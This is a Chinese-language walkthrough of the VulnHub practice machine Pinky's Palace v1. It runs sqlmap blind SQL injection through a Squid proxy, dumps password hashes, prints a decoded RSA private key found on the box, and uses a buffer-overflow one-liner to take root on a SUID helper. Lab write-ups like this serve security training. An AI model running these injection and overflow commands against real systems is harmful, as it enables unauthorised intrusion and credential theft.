# Pinky's Palace: v1

2024-5-6 https://www.vulnhub.com/entry/pinkys-palace-v1,225/

difficulty: Easy/Intermediate

## IP

192.168.5.22

## Scan

Open Port -> 8080,31337,64666

```
PORT      STATE SERVICE    VERSION
8080/tcp  open  http       nginx 1.10.3
|_http-title: 403 Forbidden
|_http-server-header: nginx/1.10.3
31337/tcp open  http-proxy Squid http proxy 3.5.23
|_http-title: ERROR: The requested URL could not be retrieved
|_http-server-header: squid/3.5.23
64666/tcp open  ssh        OpenSSH 7.4p1 Debian 10+deb9u2 (protocol 2.0)
| ssh-hostkey:
|   2048 df02124f4c6d50276a84e90e5b65bfa0 (RSA)
|   256 0aadaac716f71507f0a8502317f31c2e (ECDSA)
|_  256 4a2de5d8ee696155bbdbaf294e54522f (ED25519)
```

只开了 3 个端口，其中有一个 squid 代理。

8080 访问后，返回 403，看样子需要我们使用 squid 代理去访问。

通过下面这样访问还是会报错 403，看样子是内部服务只能允许本地访问：

```
curl http://192.168.5.22:8080 -x http://192.168.5.22:31337/
```

使用这样链接访问:

```
curl http://127.0.0.1:8080 -x http://192.168.5.22:31337/
```

发现有新页面：

```
Pinky's HTTP File Server
Under Development!
```

源代码中没有提示信息。

目录扫描，暂时未发现隐藏目录：

```
dirb http://127.0.0.1:8080/ -X html,php,txt,zip -p http://192.168.5.22:31337/
```

换更大的字典：

```
dirb http://127.0.0.1:8080/ /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -p http://192.168.5.22:31337/
```

发现了一个目录：http://127.0.0.1:8080/littlesecrets-main/

让我们访问看看，是一个登陆页面，并且源代码中有提示信息：

```
<!-- Luckily I only allow localhost access to my webserver! Now I won't get hacked. -->
```

目前，不知道用户名和密码，尝试用 admin:admin 登陆后，提示密码不对，但是在源代码中发现了一个提示：

```
<!-- Login Attempt Logged -->
```

表示登陆信息已经进行记录日志，那么就有可能登陆失败的相关信息存到了数据库或者日志文件中。

先用 sqlmap 尝试是否能绕过：

```
sqlmap -r req.txt --batch --proxy=http://192.168.5.22:31337
```

默认扫描配置下，没有发现信息，根据上面提示的日志已经记录，加大扫描力度，重新扫描：

```
sqlmap -r req.txt --level=5 --batch --proxy=http://192.168.5.22:31337
```

结果发现注入点：

```
parameter 'User-Agent' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable
```

爆数据(盲注有点慢)：

```
sqlmap -r req.txt --level=5 --batch --proxy=http://192.168.5.22:31337 --dbs

[*] information_schema
[*] pinky_sec_db

sqlmap -r req.txt --level=5 --batch --proxy=http://192.168.5.22:31337 -D pinky_sec_db --tables

+-------+
| logs  |
| users |
+-------+

sqlmap -r req.txt --level=5 --batch --proxy=http://192.168.5.22:31337 -D pinky_sec_db -T users --column

+--------+--------------+
| Column | Type         |
+--------+--------------+
| user   | varchar(100) |
| pass   | varchar(100) |
| uid    | int(11)      |
+--------+--------------+

sqlmap -r req.txt --level=5 --batch --proxy=http://192.168.5.22:31337 -D pinky_sec_db -T users -C user,pass --dump

+-------------+----------------------------------+
| user        | pass                             |
+-------------+----------------------------------+
| pinkymanage | d60dffed7cc0d87e1f4a11aa06ca73af |
| pinky       | f543dbfeaf238729831a321c7a68bee4 |
+-------------+----------------------------------+
```

pass 字段应该是哈希加密了，在网上寻找哈希对应的明文，只找到了 pinkymanage:3pinkysaf33pinkysaf3 进行登陆，但是登陆还是失败。

那估计这个用户凭证，很有可能是登陆 ssh 的，进行尝试，登陆成功：

```
ssh pinkymanage@192.168.5.22 -p 64666
```

ssh 登陆成功后，对系统进一步进行枚举，直接使用 linpeas 进行系统枚举。

在 /var/www/html/littlesecrets-main/ultrasecretadminf1l35 目录下，发现 note.txt，看看什么内容：

```
Hmm just in case I get locked out of my server I put this rsa key here.. Nobody will find it heh..
```

同时发现 .ultrasecret ：

```
LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQpNSUlFcEFJQkFBS0NBUUVBMTZmeEwzLyto
L0lMVFpld2t2ZWtoSVExeWswb0xJK3kzTjRBSXRraGV6MTFJaGE4CkhjN0tPeC9MOWcyamQzSDhk
R1BVZktLcjlzZXF0Zzk3WktBOTVTL3NiNHczUXRsMUFCdS9wVktaQmJHR3NIRy8KeUl2R0VQS1Mr
QlNaNHN0TVc3SG54N2NpTXVod2Nad0xxWm1zeVN1bUVDVHVlUXN3TlBibElUbHJxb2xwWUY4eApl
NDdFbDlwSHdld05XY0lybXFyYXhDSDVUQzdVaGpnR2FRd21XM3FIeXJTcXAvaksvY3RiMVpwblB2
K0RDODMzCnUvVHlqbTZ6OFJhRFpHL2dSQklyTUduTmJnNHBaRmh0Z2JHVk9mN2ZlR3ZCRlI4QmlU
KzdWRmZPN3lFdnlCeDkKZ3hyeVN4dTJaMGFPTThRUjZNR2FETWpZVW5COWFUWXV3OEdQNHdJREFR
QUJBb0lCQUE2aUg3U0lhOTRQcDRLeApXMUx0cU9VeEQzRlZ3UGNkSFJidG5YYS80d3k0dzl6M1Mv
WjkxSzBrWURPbkEwT1VvWHZJVmwvS3JmNkYxK2lZCnJsZktvOGlNY3UreXhRRXRQa291bDllQS9r
OHJsNmNiWU5jYjNPbkRmQU9IYWxYQVU4TVpGRkF4OWdrY1NwejYKNkxPdWNOSUp1eS8zUVpOSEZo
TlIrWVJDb0RLbkZuRUlMeFlMNVd6MnFwdFdNWUR1d3RtR3pPOTY4WWJMck9WMQpva1dONmdNaUVp
NXFwckJoNWE4d0JSUVZhQnJMWVdnOFdlWGZXZmtHektveEtQRkt6aEk1ajQvRWt4TERKcXQzCkxB
N0pSeG1Gbjc3L21idmFEVzhXWlgwZk9jUzh1Z3lSQkVOMFZwZG5GNmtsNnRmT1hLR2owZ2QrZ0Fp
dzBUVlIKMkNCN1BzRUNnWUVBOElXM1pzS3RiQ2tSQnRGK1ZUQnE0SzQ2czdTaFc5QVo2K2JwYitk
MU5SVDV4UkpHK0RzegpGM2NnNE4rMzluWWc4bUZ3c0Jobi9zemdWQk5XWm91V3JSTnJERXhIMHl1
NkhPSjd6TFdRYXlVaFFKaUlQeHBjCm4vRWVkNlNyY3lTZnpnbW50T2liNGh5R2pGMC93bnRqTWM3
M3h1QVZOdU84QTZXVytoZ1ZIS0VDZ1lFQTVZaVcKSzJ2YlZOQnFFQkNQK3hyQzVkSE9CSUVXdjg5
QkZJbS9Gcy9lc2g4dUU1TG5qMTFlUCsxRVpoMkZLOTJReDlZdgp5MWJNc0FrZitwdEZVSkxjazFN
MjBlZkFhU3ZPaHI1dWFqbnlxQ29mc1NVZktaYWE3blBRb3plcHFNS1hHTW95Ck1FRWVMT3c1NnNK
aFNwMFVkWHlhejlGUUFtdnpTWFVudW8xdCtnTUNnWUVBdWJ4NDJXa0NwU0M5WGtlT3lGaGcKWUdz
TE45VUlPaTlrcFJBbk9seEIzYUQ2RkY0OTRkbE5aaFIvbGtnTTlzMVlPZlJYSWhWbTBaUUNzOHBQ
RVZkQQpIeDE4ci8yRUJhV2h6a1p6bGF5ci9xR29vUXBwUkZtbUozajZyeWZCb21RbzUrSDYyVEE3
bUl1d3Qxb1hMNmM2Ci9hNjNGcVBhbmcyVkZqZmNjL3IrNnFFQ2dZQStBenJmSEZLemhXTkNWOWN1
ZGpwMXNNdENPRVlYS0QxaStSd2gKWTZPODUrT2c4aTJSZEI1RWt5dkprdXdwdjhDZjNPUW93Wmlu
YnErdkcwZ016c0M5Sk54SXRaNHNTK09PVCtDdwozbHNLeCthc0MyVng3UGlLdDh1RWJVTnZEck9Y
eFBqdVJJbU1oWDNZU1EvVUFzQkdSWlhsMDUwVUttb2VUSUtoClNoaU9WUUtCZ1FEc1M0MWltQ3hX
Mm1lNTQxdnR3QWFJcFE1bG81T1Z6RDJBOXRlRVBzVTZGMmg2WDdwV1I2SVgKQTlycExXbWJmeEdn
SjBNVmh4Q2pwZVlnU0M4VXNkTXpOYTJBcGN3T1dRZWtORTRlTHRPN1p2MlNWRHI2Y0lyYwpIY2NF
UCtNR00yZVVmQlBua2FQa2JDUHI3dG5xUGY4ZUpxaVFVa1dWaDJDbll6ZUFIcjVPbUE9PQotLS0t
LUVORCBSU0EgUFJJVkFURSBLRVktLS0tLQo=
```

内容像是 base64，base64 -d 后得到私钥并保存结果：

```
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA16fxL3/+h/ILTZewkvekhIQ1yk0oLI+y3N4AItkhez11Iha8
Hc7KOx/L9g2jd3H8dGPUfKKr9seqtg97ZKA95S/sb4w3Qtl1ABu/pVKZBbGGsHG/
yIvGEPKS+BSZ4stMW7Hnx7ciMuhwcZwLqZmsySumECTueQswNPblITlrqolpYF8x
e47El9pHwewNWcIrmqraxCH5TC7UhjgGaQwmW3qHyrSqp/jK/ctb1ZpnPv+DC833
u/Tyjm6z8RaDZG/gRBIrMGnNbg4pZFhtgbGVOf7feGvBFR8BiT+7VFfO7yEvyBx9
gxrySxu2Z0aOM8QR6MGaDMjYUnB9aTYuw8GP4wIDAQABAoIBAA6iH7SIa94Pp4Kx
W1LtqOUxD3FVwPcdHRbtnXa/4wy4w9z3S/Z91K0kYDOnA0OUoXvIVl/Krf6F1+iY
rlfKo8iMcu+yxQEtPkoul9eA/k8rl6cbYNcb3OnDfAOHalXAU8MZFFAx9gkcSpz6
6LOucNIJuy/3QZNHFhNR+YRCoDKnFnEILxYL5Wz2qptWMYDuwtmGzO968YbLrOV1
okWN6gMiEi5qprBh5a8wBRQVaBrLYWg8WeXfWfkGzKoxKPFKzhI5j4/EkxLDJqt3
LA7JRxmFn77/mbvaDW8WZX0fOcS8ugyRBEN0VpdnF6kl6tfOXKGj0gd+gAiw0TVR
2CB7PsECgYEA8IW3ZsKtbCkRBtF+VTBq4K46s7ShW9AZ6+bpb+d1NRT5xRJG+Dsz
F3cg4N+39nYg8mFwsBhn/szgVBNWZouWrRNrDExH0yu6HOJ7zLWQayUhQJiIPxpc
n/Eed6SrcySfzgmntOib4hyGjF0/wntjMc73xuAVNuO8A6WW+hgVHKECgYEA5YiW
K2vbVNBqEBCP+xrC5dHOBIEWv89BFIm/Fs/esh8uE5Lnj11eP+1EZh2FK92Qx9Yv
y1bMsAkf+ptFUJLck1M20efAaSvOhr5uajnyqCofsSUfKZaa7nPQozepqMKXGMoy
MEEeLOw56sJhSp0UdXyaz9FQAmvzSXUnuo1t+gMCgYEAubx42WkCpSC9XkeOyFhg
YGsLN9UIOi9kpRAnOlxB3aD6FF494dlNZhR/lkgM9s1YOfRXIhVm0ZQCs8pPEVdA
Hx18r/2EBaWhzkZzlayr/qGooQppRFmmJ3j6ryfBomQo5+H62TA7mIuwt1oXL6c6
/a63FqPang2VFjfcc/r+6qECgYA+AzrfHFKzhWNCV9cudjp1sMtCOEYXKD1i+Rwh
Y6O85+Og8i2RdB5EkyvJkuwpv8Cf3OQowZinbq+vG0gMzsC9JNxItZ4sS+OOT+Cw
3lsKx+asC2Vx7PiKt8uEbUNvDrOXxPjuRImMhX3YSQ/UAsBGRZXl050UKmoeTIKh
ShiOVQKBgQDsS41imCxW2me541vtwAaIpQ5lo5OVzD2A9teEPsU6F2h6X7pWR6IX
A9rpLWmbfxGgJ0MVhxCjpeYgSC8UsdMzNa2ApcwOWQekNE4eLtO7Zv2SVDr6cIrc
HccEP+MGM2eUfBPnkaPkbCPr7tnqPf8eJqiQUkWVh2CnYzeAHr5OmA==
-----END RSA PRIVATE KEY-----
```

这个 ssh 密钥应该是另一个用户 pinky 的，尝试登陆。

```
chmod 600 id_rsa
ssh -i id_rsa pink@192.168.5.22 -p 64666
```

登陆成功。查看 note.txt 提示文件：

```
Been working on this program to help me when I need to do administrator tasks sudo is just too hard to configure and I can never remember my root password! Sadly I'm fairly new to C so I was working on my printing skills because Im not sure how to implement shell spawning yet :(
```

发现当前目录下，有 SUID 程序 adminhelper，上面指的程序应该就是这个。

尝试执行 adminhelper ：

```
pinky@pinkys-palace:~$ ./adminhelper 123
123

pinky@pinkys-palace:~$ ./adminhelper $(python -c 'print("A" * 1024)')
Segmentation fault
```

表名存在缓冲区溢出，可以进行利用。

strings adminhelper 后，发现程序中使用了 spawn，可以进行利用。

经过查询资料，找到可利用的漏洞代码：

```
./adminhelper $(python -c "print 'A'*72+'\xd0\x47\x55\x55\x55\x55'")
```

执行后得到了 root 权限，并且得到了 root flag：

```
# cat root.txt
===========[!!!CONGRATS!!!]===========

[+] You r00ted Pinky's Palace Intermediate!
[+] I hope you enjoyed this box!
[+] Cheers to VulnHub!
[+] Twitter: @Pink_P4nther

Flag: 99975cfc5e2eb4c199d38d4a2b2c03ce
```
